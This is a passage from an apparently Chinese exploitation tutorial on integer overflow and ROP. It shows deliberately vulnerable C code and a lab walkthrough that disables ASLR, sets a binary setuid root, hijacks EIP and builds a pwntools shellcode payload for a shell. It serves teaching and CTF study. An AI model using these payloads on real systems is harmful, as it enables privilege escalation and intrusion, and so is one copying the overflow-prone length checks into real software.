= -2 147 483 648 \u4e0b\u6ea2\u51fa i = INT_MIN; // -2 147 483 648 i--; printf(\"i = %d\\n\", i); // i = 2 147 483 647 \u65e0\u7b26\u53f7\u6570\u56de\u7ed5 \u6d89\u53ca\u65e0\u7b26\u53f7\u6570\u7684\u8ba1\u7b97\u6c38\u8fdc\u4e0d\u4f1a\u6ea2\u51fa\uff0c\u56e0\u4e3a\u4e0d\u80fd\u7528\u7ed3\u679c\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\u8868\u793a\u7684\u7ed3\u679c\u503c\u88ab\u8be5\u7c7b\u578b\u53ef\u4ee5\u8868\u793a\u7684\u6700\u5927\u503c\u52a0 1 \u4e4b\u548c\u53d6\u6a21\u51cf\uff08reduced modulo\uff09\u3002\u56e0\u4e3a\u56de\u7ed5\uff0c\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u6570\u8868\u8fbe\u5f0f\u6c38\u8fdc\u65e0\u6cd5\u6c42\u51fa\u5c0f\u4e8e\u96f6\u7684\u503c\u3002 \u4f7f\u7528\u4e0b\u56fe\u76f4\u89c2\u5730\u7406\u89e3\u56de\u7ed5\uff0c\u5728\u8f6e\u4e0a\u6309\u987a\u65f6\u9488\u65b9\u5411\u5c06\u503c\u9012\u589e\u4ea7\u751f\u7684\u503c\u7d27\u6328\u7740\u5b83\uff1a unsigned int ui; ui = UINT_MAX; // \u5728 x86-32 \u4e0a\u4e3a 4 294 967 295 ui++; printf(\"ui = %u\\n\", ui); // ui = 0 ui = 0; ui--; printf(\"ui = %u\\n\", ui); // \u5728 x86-32 \u4e0a\uff0cui = 4 294 967 295 \u622a\u65ad \u52a0\u6cd5\u622a\u65ad\uff1a 0xffffffff + 0x00000001 = 0x0000000100000000 (long long) = 0x00000000 (long) \u4e58\u6cd5\u622a\u65ad\uff1a 0x00123456 * 0x00654321 = 0x000007336BF94116 (long long) = 0x6BF94116 (long) \u6574\u578b\u63d0\u5347\u548c\u5bbd\u5ea6\u6ea2\u51fa \u6574\u578b\u63d0\u5347\u662f\u6307\u5f53\u8ba1\u7b97\u8868\u8fbe\u5f0f\u4e2d\u5305\u542b\u4e86\u4e0d\u540c\u5bbd\u5ea6\u7684\u64cd\u4f5c\u6570\u65f6\uff0c\u8f83\u5c0f\u5bbd\u5ea6\u7684\u64cd\u4f5c\u6570\u4f1a\u88ab\u63d0\u5347\u5230\u548c\u8f83\u5927\u64cd\u4f5c\u6570\u4e00\u6837\u7684\u5bbd\u5ea6\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8ba1\u7b97\u3002 \u793a\u4f8b\uff1a \u6e90\u7801 #include<stdio.h> void main() { int l; short s; char c; l = 0xabcddcba; s = l; c = l; printf(\"\u5bbd\u5ea6\u6ea2\u51fa\\n\"); printf(\"l = 0x%x (%d bits)\\n\", l, sizeof(l) * 8); printf(\"s = 0x%x (%d bits)\\n\", s, sizeof(s) * 8); printf(\"c = 0x%x (%d bits)\\n\", c, sizeof(c) * 8); printf(\"\u6574\u578b\u63d0\u5347\\n\"); printf(\"s + c = 0x%x (%d bits)\\n\", s+c, sizeof(s+c) * 8); } $ ./a.out \u5bbd\u5ea6\u6ea2\u51fa l = 0xabcddcba (32 bits) s = 0xffffdcba (16 bits) c = 0xffffffba (8 bits) \u6574\u578b\u63d0\u5347 s + c = 0xffffdc74 (32 bits) \u4f7f\u7528 gdb \u67e5\u770b\u53cd\u6c47\u7f16\u4ee3\u7801\uff1a gdb-peda$ disassemble main Dump of assembler code for function main: 0x0000056d <+0>: lea ecx,[esp+0x4] 0x00000571 <+4>: and esp,0xfffffff0 0x00000574 <+7>: push DWORD PTR [ecx-0x4] 0x00000577 <+10>: push ebp 0x00000578 <+11>: mov ebp,esp 0x0000057a <+13>: push ebx 0x0000057b <+14>: push ecx 0x0000057c <+15>: sub esp,0x10 0x0000057f <+18>: call 0x470 <__x86.get_pc_thunk.bx> 0x00000584 <+23>: add ebx,0x1a7c 0x0000058a <+29>: mov DWORD PTR [ebp-0xc],0xabcddcba 0x00000591 <+36>: mov eax,DWORD PTR [ebp-0xc] 0x00000594 <+39>: mov WORD PTR [ebp-0xe],ax 0x00000598 <+43>: mov eax,DWORD PTR [ebp-0xc] 0x0000059b <+46>: mov BYTE PTR [ebp-0xf],al 0x0000059e <+49>: sub esp,0xc 0x000005a1 <+52>: lea eax,[ebx-0x1940] 0x000005a7 <+58>: push eax 0x000005a8 <+59>: call 0x400 <puts@plt> 0x000005ad <+64>: add esp,0x10 0x000005b0 <+67>: sub esp,0x4 0x000005b3 <+70>: push 0x20 0x000005b5 <+72>: push DWORD PTR [ebp-0xc] 0x000005b8 <+75>: lea eax,[ebx-0x1933] 0x000005be <+81>: push eax 0x000005bf <+82>: call 0x3f0 <printf@plt> 0x000005c4 <+87>: add esp,0x10 0x000005c7 <+90>: movsx eax,WORD PTR [ebp-0xe] 0x000005cb <+94>: sub esp,0x4 0x000005ce <+97>: push 0x10 0x000005d0 <+99>: push eax 0x000005d1 <+100>: lea eax,[ebx-0x191f] 0x000005d7 <+106>: push eax 0x000005d8 <+107>: call 0x3f0 <printf@plt> 0x000005dd <+112>: add esp,0x10 0x000005e0 <+115>: movsx eax,BYTE PTR [ebp-0xf] 0x000005e4 <+119>: sub esp,0x4 0x000005e7 <+122>: push 0x8 0x000005e9 <+124>: push eax 0x000005ea <+125>: lea eax,[ebx-0x190b] 0x000005f0 <+131>: push eax 0x000005f1 <+132>: call 0x3f0 <printf@plt> 0x000005f6 <+137>: add esp,0x10 0x000005f9 <+140>: sub esp,0xc 0x000005fc <+143>: lea eax,[ebx-0x18f7] 0x00000602 <+149>: push eax 0x00000603 <+150>: call 0x400 <puts@plt> 0x00000608 <+155>: add esp,0x10 0x0000060b <+158>: movsx edx,WORD PTR [ebp-0xe] 0x0000060f <+162>: movsx eax,BYTE PTR [ebp-0xf] 0x00000613 <+166>: add eax,edx 0x00000615 <+168>: sub esp,0x4 0x00000618 <+171>: push 0x20 0x0000061a <+173>: push eax 0x0000061b <+174>: lea eax,[ebx-0x18ea] 0x00000621 <+180>: push eax 0x00000622 <+181>: call 0x3f0 <printf@plt> 0x00000627 <+186>: add esp,0x10 0x0000062a <+189>: nop 0x0000062b <+190>: lea esp,[ebp-0x8] 0x0000062e <+193>: pop ecx 0x0000062f <+194>: pop ebx 0x00000630 <+195>: pop ebp 0x00000631 <+196>: lea esp,[ecx-0x4] 0x00000634 <+199>: ret End of assembler dump. \u5728\u6574\u6570\u8f6c\u6362\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6709\u53ef\u80fd\u5bfc\u81f4\u4e0b\u9762\u7684\u9519\u8bef\uff1a \u635f\u5931\u503c\uff1a\u8f6c\u6362\u4e3a\u503c\u7684\u5927\u5c0f\u4e0d\u80fd\u8868\u793a\u7684\u4e00\u79cd\u7c7b\u578b \u635f\u5931\u7b26\u53f7\uff1a\u4ece\u6709\u7b26\u53f7\u7c7b\u578b\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u7c7b\u578b\uff0c\u5bfc\u81f4\u635f\u5931\u7b26\u53f7 \u6f0f\u6d1e\u591a\u53d1\u51fd\u6570 \u6211\u4eec\u8bf4\u8fc7\u6574\u6570\u6ea2\u51fa\u8981\u914d\u5408\u4e0a\u5176\u4ed6\u7c7b\u578b\u7684\u7f3a\u9677\u624d\u80fd\u6709\u7528\uff0c\u4e0b\u9762\u7684\u4e24\u4e2a\u51fd\u6570\u90fd\u6709\u4e00\u4e2a size_t \u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5e38\u5e38\u88ab\u8bef\u7528\u800c\u4ea7\u751f\u6574\u6570\u6ea2\u51fa\uff0c\u63a5\u7740\u5c31\u53ef\u80fd\u5bfc\u81f4\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u3002 #include <string.h> void *memcpy(void *dest, const void *src, size_t n); memcpy() \u51fd\u6570\u5c06 src \u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u4e2d\u4ee5 src \u5730\u5740\u5f00\u59cb\u7684\u524d n \u4e2a\u5b57\u8282\u590d\u5236\u5230 dest \u6240\u6307\u7684\u6570\u7ec4\u4e2d\uff0c\u5e76\u8fd4\u56de dest \u3002 #include <string.h> char *strncpy(char *dest, const char *src, size_t n); strncpy() \u51fd\u6570\u4ece\u6e90 src \u6240\u6307\u7684\u5185\u5b58\u5730\u5740\u7684\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\u590d\u5236 n \u4e2a\u5b57\u8282\u5230\u76ee\u6807 dest \u6240\u6307\u7684\u5185\u5b58\u5730\u5740\u7684\u8d77\u59cb\u4f4d\u7f6e\u4e2d\u3002 \u4e24\u4e2a\u51fd\u6570\u4e2d\u90fd\u6709\u4e00\u4e2a\u7c7b\u578b\u4e3a size_t \u7684\u53c2\u6570\uff0c\u5b83\u662f\u65e0\u7b26\u53f7\u6574\u578b\u7684 sizeof \u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\u3002 typedef unsigned int size_t; \u6574\u6570\u6ea2\u51fa\u793a\u4f8b \u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u6574\u6570\u6ea2\u51fa\u7684\u539f\u7406\u548c\u4e3b\u8981\u5f62\u5f0f\uff0c\u4e0b\u9762\u6211\u4eec\u5148\u770b\u51e0\u4e2a\u7b80\u5355\u793a\u4f8b\uff0c\u7136\u540e\u5b9e\u9645\u64cd\u4f5c\u5229\u7528\u4e00\u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u3002 \u793a\u4f8b \u793a\u4f8b\u4e00\uff0c\u6574\u6570\u8f6c\u6362\uff1a char buf[80]; void vulnerable() { int len = read_int_from_network(); char *p = read_string_from_network(); if (len > 80) { error(\"length too large: bad dog, no cookie for you!\"); return; } memcpy(buf, p, len); } \u8fd9\u4e2a\u4f8b\u5b50\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u653b\u51fb\u8005\u7ed9 len \u8d4b\u4e8e\u4e86\u4e00\u4e2a\u8d1f\u6570\uff0c\u5219\u53ef\u4ee5\u7ed5\u8fc7 if \u8bed\u53e5\u7684\u68c0\u6d4b\uff0c\u800c\u6267\u884c\u5230 memcpy() \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f size_t \u7c7b\u578b\uff0c\u8d1f\u6570 len \u4f1a\u88ab\u8f6c\u6362\u4e3a\u4e00\u4e2a\u65e0\u7b26\u53f7\u6574\u578b\uff0c\u5b83\u53ef\u80fd\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6b63\u6570\uff0c\u4ece\u800c\u590d\u5236\u4e86\u5927\u91cf\u7684\u5185\u5bb9\u5230 buf \u4e2d\uff0c\u5f15\u53d1\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \u793a\u4f8b\u4e8c\uff0c\u56de\u7ed5\u548c\u6ea2\u51fa\uff1a void vulnerable() { size_t len; // int len; char* buf; len = read_int_from_network(); buf = malloc(len + 5); read(fd, buf, len); ... } \u8fd9\u4e2a\u4f8b\u5b50\u770b\u4f3c\u907f\u5f00\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4f46\u662f\u5982\u679c len \u8fc7\u5927\uff0c len+5 \u6709\u53ef\u80fd\u53d1\u751f\u56de\u7ed5\u3002\u6bd4\u5982\u8bf4\uff0c\u5728 x86-32 \u4e0a\uff0c\u5982\u679c len = 0xFFFFFFFF \uff0c\u5219 len+5 = 0x00000004 \uff0c\u8fd9\u65f6 malloc() \u53ea\u5206\u914d\u4e86 4 \u5b57\u8282\u7684\u5185\u5b58\u533a\u57df\uff0c\u7136\u540e\u5728\u91cc\u9762\u5199\u5165\u5927\u91cf\u7684\u6570\u636e\uff0c\u7f13\u51b2\u533a\u6ea2\u51fa\u4e5f\u5c31\u53d1\u751f\u4e86\u3002\uff08\u5982\u679c\u5c06 len \u58f0\u660e\u4e3a\u6709\u7b26\u53f7 int \u7c7b\u578b\uff0c len+5 \u53ef\u80fd\u53d1\u751f\u6ea2\u51fa\uff09 \u793a\u4f8b\u4e09\uff0c\u622a\u65ad\uff1a void main(int argc, char *argv[]) { unsigned short int total; total = strlen(argv[1]) + strlen(argv[2]) + 1; char *buf = (char *)malloc(total); strcpy(buf, argv[1]); strcat(buf, argv[2]); ... } \u8fd9\u4e2a\u4f8b\u5b50\u63a5\u53d7\u4e24\u4e2a\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u53c2\u6570\u5e76\u8ba1\u7b97\u5b83\u4eec\u7684\u603b\u957f\u5ea6\uff0c\u7a0b\u5e8f\u5206\u914d\u8db3\u591f\u7684\u5185\u5b58\u6765\u5b58\u50a8\u62fc\u63a5\u540e\u7684\u5b57\u7b26\u4e32\u3002\u9996\u5148\u5c06\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u590d\u5236\u5230\u7f13\u51b2\u533a\u4e2d\uff0c\u7136\u540e\u5c06\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8fde\u63a5\u5230\u5c3e\u90e8\u3002\u5982\u679c\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u4e24\u4e2a\u5b57\u7b26\u4e32\u603b\u957f\u5ea6\u65e0\u6cd5\u7528 total \u8868\u793a\uff0c\u5219\u4f1a\u53d1\u751f\u622a\u65ad\uff0c\u4ece\u800c\u5bfc\u81f4\u540e\u9762\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 \u5b9e\u6218 \u770b\u4e86\u4e0a\u9762\u7684\u793a\u4f8b\uff0c\u6211\u4eec\u6765\u771f\u6b63\u5229\u7528\u4e00\u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u3002 \u6e90\u7801 #include<stdio.h> #include<string.h> void validate_passwd(char *passwd) { char passwd_buf[11]; unsigned char passwd_len = strlen(passwd); if(passwd_len >= 4 && passwd_len <= 8) { printf(\"good!\\n\"); strcpy(passwd_buf, passwd); } else { printf(\"bad!\\n\"); } } int main(int argc, char *argv[]) { if(argc != 2) { printf(\"error\\n\"); return 0; } validate_passwd(argv[1]); } \u4e0a\u9762\u7684\u7a0b\u5e8f\u4e2d strlen() \u8fd4\u56de\u7c7b\u578b\u662f size_t \uff0c\u5374\u88ab\u5b58\u50a8\u5728\u65e0\u7b26\u53f7\u5b57\u7b26\u4e32\u7c7b\u578b\u4e2d\uff0c\u4efb\u610f\u8d85\u8fc7\u65e0\u7b26\u53f7\u5b57\u7b26\u4e32\u6700\u5927\u4e0a\u9650\u503c\uff08256 \u5b57\u8282\uff09\u7684\u6570\u636e\u90fd\u4f1a\u5bfc\u81f4\u622a\u65ad\u5f02\u5e38\u3002\u5f53\u5bc6\u7801\u957f\u5ea6\u4e3a 261 \u65f6\uff0c\u622a\u65ad\u540e\u503c\u53d8\u4e3a 5\uff0c\u6210\u529f\u7ed5\u8fc7\u4e86 if \u7684\u5224\u65ad\uff0c\u5bfc\u81f4\u6808\u6ea2\u51fa\u3002\u4e0b\u9762\u6211\u4eec\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u6765\u83b7\u5f97 shell\u3002 \u7f16\u8bd1\u547d\u4ee4\uff1a # echo 0 > /proc/sys/kernel/randomize_va_space $ gcc -g -fno-stack-protector -z execstack vuln.c $ sudo chown root vuln $ sudo chgrp root vuln $ sudo chmod +s vuln \u4f7f\u7528 gdb \u53cd\u6c47\u7f16 validate_passwd \u51fd\u6570\u3002 gdb-peda$ disassemble validate_passwd Dump of assembler code for function validate_passwd: 0x0000059d <+0>: push ebp ; \u538b\u5165 ebp 0x0000059e <+1>: mov ebp,esp 0x000005a0 <+3>: push ebx ; \u538b\u5165 ebx 0x000005a1 <+4>: sub esp,0x14 0x000005a4 <+7>: call 0x4a0 <__x86.get_pc_thunk.bx> 0x000005a9 <+12>: add ebx,0x1a57 0x000005af <+18>: sub esp,0xc 0x000005b2 <+21>: push DWORD PTR [ebp+0x8] 0x000005b5 <+24>: call 0x430 <strlen@plt> 0x000005ba <+29>: add esp,0x10 0x000005bd <+32>: mov BYTE PTR [ebp-0x9],al ; \u5c06 len \u5b58\u5165 [ebp-0x9] 0x000005c0 <+35>: cmp BYTE PTR [ebp-0x9],0x3 0x000005c4 <+39>: jbe 0x5f2 <validate_passwd+85> 0x000005c6 <+41>: cmp BYTE PTR [ebp-0x9],0x8 0x000005ca <+45>: ja 0x5f2 <validate_passwd+85> 0x000005cc <+47>: sub esp,0xc 0x000005cf <+50>: lea eax,[ebx-0x1910] 0x000005d5 <+56>: push eax 0x000005d6 <+57>: call 0x420 <puts@plt> 0x000005db <+62>: add esp,0x10 0x000005de <+65>: sub esp,0x8 0x000005e1 <+68>: push DWORD PTR [ebp+0x8] 0x000005e4 <+71>: lea eax,[ebp-0x14] ; \u53d6 passwd_buf \u5730\u5740 0x000005e7 <+74>: push eax ; \u538b\u5165 passwd_buf 0x000005e8 <+75>: call 0x410 <strcpy@plt> 0x000005ed <+80>: add esp,0x10 0x000005f0 <+83>: jmp 0x604 <validate_passwd+103> 0x000005f2 <+85>: sub esp,0xc 0x000005f5 <+88>: lea eax,[ebx-0x190a] 0x000005fb <+94>: push eax 0x000005fc <+95>: call 0x420 <puts@plt> 0x00000601 <+100>: add esp,0x10 0x00000604 <+103>: nop 0x00000605 <+104>: mov ebx,DWORD PTR [ebp-0x4] 0x00000608 <+107>: leave 0x00000609 <+108>: ret End of assembler dump. \u901a\u8fc7\u9605\u8bfb\u53cd\u6c47\u7f16\u4ee3\u7801\uff0c\u6211\u4eec\u77e5\u9053\u7f13\u51b2\u533a passwd_buf \u4f4d\u4e8e ebp=0x14 \u7684\u4f4d\u7f6e\uff08 0x000005e4 <+71>: lea eax,[ebp-0x14] \uff09\uff0c\u800c\u8fd4\u56de\u5730\u5740\u5728 ebp+4 \u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8e\u7f13\u51b2\u533a 0x18 \u7684\u4f4d\u7f6e\u3002\u6211\u4eec\u6d4b\u8bd5\u4e00\u4e0b\uff1a gdb-peda$ r `python2 -c 'print \"A\"*24 + \"B\"*4 + \"C\"*233'` Starting program: /home/a.out `python2 -c 'print \"A\"*24 + \"B\"*4 + \"C\"*233'` good! Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xffffd0f4 ('A' <repeats 24 times>, \"BBBB\", 'C' <repeats 172 times>...) EBX: 0x41414141 ('AAAA') ECX: 0xffffd490 --> 0x534c0043 ('C') EDX: 0xffffd1f8 --> 0xffff0043 --> 0x0 ESI: 0xf7f95000 --> 0x1bbd90 EDI: 0x0 EBP: 0x41414141 ('AAAA') ESP: 0xffffd110 ('C' <repeats 200 times>...) EIP: 0x42424242 ('BBBB') EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x42424242 [------------------------------------stack-------------------------------------] 0000| 0xffffd110 ('C' <repeats 200 times>...) 0004| 0xffffd114 ('C' <repeats 200 times>...) 0008| 0xffffd118 ('C' <repeats 200 times>...) 0012| 0xffffd11c ('C' <repeats 200 times>...) 0016| 0xffffd120 ('C' <repeats 200 times>...) 0020| 0xffffd124 ('C' <repeats 200 times>...) 0024| 0xffffd128 ('C' <repeats 200 times>...) 0028| 0xffffd12c ('C' <repeats 200 times>...) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x42424242 in ?? () \u53ef\u4ee5\u770b\u5230 EIP \u88ab BBBB \u8986\u76d6\uff0c\u76f8\u5f53\u4e8e\u6211\u4eec\u83b7\u5f97\u4e86\u8fd4\u56de\u5730\u5740\u7684\u63a7\u5236\u6743\u3002\u6784\u5efa\u4e0b\u9762\u7684 payload\uff1a from pwn import * ret_addr = 0xffffd118 # ebp = 0xffffd108 shellcode = shellcraft.i386.sh() payload = \"A\" * 24 payload += p32(ret_addr) payload += \"\\x90\" * 20 payload += asm(shellcode) payload += \"C\" * 169 # 24 + 4 + 20 + 44 + 169 = 261 3.1.4 \u8fd4\u56de\u5bfc\u5411\u7f16\u7a0b\uff08ROP\uff09 ROP \u7b80\u4ecb \u5bfb\u627e gadgets \u5e38\u7528\u7684 gadgets ROP Emporium ret2win32 ret2win split32 split callme32 callme write432 write4 badchars32 badchars fluff32 fluff pivot32 pivot \u66f4\u591a\u8d44\u6599 ROP \u7b80\u4ecb \u8fd4\u56de\u5bfc\u5411\u7f16\u7a0b\uff08Return-Oriented Programming\uff0c\u7f29\u5199\uff1aROP\uff09\u662f\u4e00\u79cd\u9ad8\u7ea7\u7684\u5185\u5b58\u653b\u51fb\u6280\u672f\uff0c\u8be5\u6280\u672f\u5141\u8bb8\u653b\u51fb\u8005\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u7684\u5404\u79cd\u901a\u7528\u9632\u5fa1\u4e0b\u6267\u884c\u4ee3\u7801\uff0c\u5982\u5185\u5b58\u4e0d\u53ef\u6267\u884c\u548c\u4ee3\u7801\u7b7e\u540d\u7b49\u3002\u8fd9\u7c7b\u653b\u51fb\u5f80\u5f80\u5229\u7528\u64cd\u4f5c\u5806\u6808\u8c03\u7528\u65f6\u7684\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u901a\u5e38\u662f\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\u653b\u51fb\u8005\u63a7\u5236\u5806\u6808\u8c03\u7528\u4ee5\u52ab\u6301\u7a0b\u5e8f\u63a7\u5236\u6d41\u5e76\u6267\u884c\u9488\u5bf9\u6027\u7684\u673a\u5668\u8bed\u8a00\u6307\u4ee4\u5e8f\u5217\uff08gadgets\uff09\uff0c\u6bcf\u4e00\u6bb5 gadget \u901a\u5e38\u4ee5 return \u6307\u4ee4\uff08 ret \uff0c\u673a\u5668\u7801\u4e3a c3 \uff09\u7ed3\u675f\uff0c\u5e76\u4f4d\u4e8e\u5171\u4eab\u5e93\u4ee3\u7801\u4e2d\u7684\u5b50\u7a0b\u5e8f\u4e2d\u3002\u901a\u8fc7\u6267\u884c\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u4e5f\u5c31\u63a7\u5236\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u3002 ret \u6307\u4ee4\u76f8\u5f53\u4e8e pop eip \u3002\u5373\uff0c\u9996\u5148\u5c06 esp \u6307\u5411\u7684 4 \u5b57\u8282\u5185\u5bb9\u8bfb\u53d6\u5e76\u8d4b\u503c\u7ed9 eip \uff0c\u7136\u540e esp \u52a0\u4e0a 4 \u5b57\u8282\u6307\u5411\u6808\u7684\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5982\u679c\u5f53\u524d\u6267\u884c\u7684\u6307\u4ee4\u5e8f\u5217\u4ecd\u7136\u4ee5 ret \u6307\u4ee4\u7ed3\u675f\uff0c\u5219\u8fd9\u4e2a\u8fc7\u7a0b\u5c06\u91cd\u590d\uff0c esp \u518d\u6b21\u589e\u52a0\u5e76\u4e14\u6267\u884c\u4e0b\u4e00\u4e2a\u6307\u4ee4\u5e8f\u5217\u3002 \u5bfb\u627e gadgets \u5728\u7a0b\u5e8f\u4e2d\u5bfb\u627e\u6240\u6709\u7684 c3\uff08ret\uff09 \u5b57\u8282 \u5411\u524d\u641c\u7d22\uff0c\u770b\u524d\u9762\u7684\u5b57\u8282\u662f\u5426\u5305\u542b\u4e00\u4e2a\u6709\u6548\u6307\u4ee4\uff0c\u8fd9\u91cc\u53ef\u4ee5\u6307\u5b9a\u6700\u5927\u641c\u7d22\u5b57\u8282\u6570\uff0c\u4ee5\u83b7\u5f97\u4e0d\u540c\u957f\u5ea6\u7684 gadgets \u8bb0\u5f55\u4e0b\u6211\u4eec\u627e\u5230\u7684\u6240\u6709\u6709\u6548\u6307\u4ee4\u5e8f\u5217 \u7406\u8bba\u4e0a\u6211\u4eec\u662f\u53ef\u4ee5\u8fd9\u6837\u5bfb\u627e gadgets \u7684\uff0c\u4f46\u5b9e\u9645\u4e0a\u6709\u5f88\u591a\u5de5\u5177\u53ef\u4ee5\u5b8c\u6210\u8fd9\u4e2a\u5de5\u4f5c\uff0c\u5982 ROPgadget\uff0cRopper \u7b49\u3002\u66f4\u5b8c\u6574\u7684\u641c\u7d22\u53ef\u4ee5\u4f7f\u7528 http://ropshell.com/\u3002 \u5e38\u7528\u7684 gadgets \u5bf9\u4e8e gadgets \u80fd\u505a\u7684\u4e8b\u60c5\uff0c\u57fa\u672c\u4e0a\u53ea\u8981\u4f60\u6562\u60f3\uff0c\u5b83\u5c31\u6562\u6267\u884c\u3002\u4e0b\u9762\u7b80\u5355\u4ecb\u7ecd\u51e0\u79cd\u7528\u6cd5\uff1a \u4fdd\u5b58\u6808\u6570\u636e\u5230\u5bc4\u5b58\u5668 \u5c06\u6808\u9876\u7684\u6570\u636e\u629b\u51fa\u5e76\u4fdd\u5b58\u5230\u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u65b0\u7684\u6808\u9876\u5730\u5740\u3002\u6240\u4ee5\u5f53\u8fd4\u56de\u5730\u5740\u88ab\u4e00\u4e2a gadgets \u7684\u5730\u5740\u8986\u76d6\uff0c\u7a0b\u5e8f\u5c06\u5728\u8fd4\u56de\u540e\u6267\u884c\u8be5\u6307\u4ee4\u5e8f\u5217\u3002 \u5982\uff1a pop eax; ret \u4fdd\u5b58\u5185\u5b58\u6570\u636e\u5230\u5bc4\u5b58\u5668 \u5c06\u5185\u5b58\u5730\u5740\u5904\u7684\u6570\u636e\u52a0\u8f7d\u5230\u5185\u5b58\u5668\u4e2d\u3002 \u5982\uff1a mov ecx,[eax]; ret \u4fdd\u5b58\u5bc4\u5b58\u5668\u6570\u636e\u5230\u5185\u5b58 \u5c06\u5bc4\u5b58\u5668\u7684\u503c\u4fdd\u5b58\u5230\u5185\u5b58\u5730\u5740\u5904\u3002 \u5982\uff1a mov [eax],ecx; ret \u7b97\u6570\u548c\u903b\u8f91\u8fd0\u7b97 add, sub, mul, xor \u7b49\u3002 \u5982\uff1a add eax,ebx; ret , xor edx,edx; ret \u7cfb\u7edf\u8c03\u7528 \u6267\u884c\u5185\u6838\u4e2d\u65ad \u5982\uff1a int 0x80; ret , call gs:[0x10]; ret \u4f1a\u5f71\u54cd\u6808\u5e27\u7684 gadgets \u8fd9\u4e9b gadgets \u4f1a\u6539\u53d8 ebp \u7684\u503c\uff0c\u4ece\u800c\u5f71\u54cd\u6808\u5e27\uff0c\u5728\u4e00\u4e9b\u64cd\u4f5c\u5982 stack pivot \u65f6\u6211\u4eec\u9700\u8981\u8fd9\u6837\u7684\u6307\u4ee4\u6765\u8f6c\u79fb\u6808\u5e27\u3002 \u5982\uff1a leave; ret , pop ebp; ret ROP Emporium ROP Emporium \u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7528\u4e8e\u5b66\u4e60 ROP \u7684\u6311\u6218\uff0c\u6bcf\u4e00\u4e2a\u6311\u6218\u90fd\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u77e5\u8bc6\uff0c\u96be\u5ea6\u4e5f\u9010\u6e10\u589e\u52a0\uff0c\u662f\u5faa\u5e8f\u6e10\u8fdb\u5b66\u4e60 ROP \u7684\u597d\u8d44\u6599\u3002ROP Emporium \u8fd8\u6709\u4e2a\u7279\u70b9\u662f\u5b83\u4e13\u6ce8\u4e8e ROP\uff0c\u6240\u6709\u6311\u6218\u90fd\u6709\u76f8\u540c\u7684\u6f0f\u6d1e\u70b9\uff0c\u4e0d\u540c\u7684\u53ea\u662f ROP \u94fe\u6784\u9020\u7684\u4e0d\u540c\uff0c\u6240\u4ee5\u4e0d\u6d89\u53ca\u5176\u4ed6\u7684\u6f0f\u6d1e\u5229\u7528\u548c\u9006\u5411\u7684\u5185\u5bb9\u3002\u6bcf\u4e2a\u6311\u6218\u90fd\u5305\u542b\u4e86 32 \u4f4d\u548c 64 \u4f4d\u7684\u7a0b\u5e8f\uff0c\u901a\u8fc7\u5bf9\u6bd4\u80fd\u5e2e\u52a9\u6211\u4eec\u7406\u89e3 ROP \u94fe\u5728\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e0b\u7684\u5dee\u5f02\uff0c\u4f8b\u5982\u53c2\u6570\u7684\u4f20\u9012\u7b49\u3002\u8fd9\u7bc7\u6587\u7ae0\u6211\u4eec\u5c31\u4ece\u8fd9\u4e9b\u6311\u6218\u4e2d\u6765\u5b66\u4e60\u5427\u3002 \u8fd9\u4e9b\u6311\u6218\u90fd\u5305\u542b\u4e00\u4e2a flag.txt \u7684\u6587\u4ef6\uff0c\u6211\u4eec\u7684\u76ee\u6807\u5c31\u662f\u901a\u8fc7\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\uff0c\u6765\u6253\u5370\u51fa\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u3002\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u83b7\u5f97 shell\u3002 \u4e0b\u8f7d\u6587\u4ef6 ret2win32 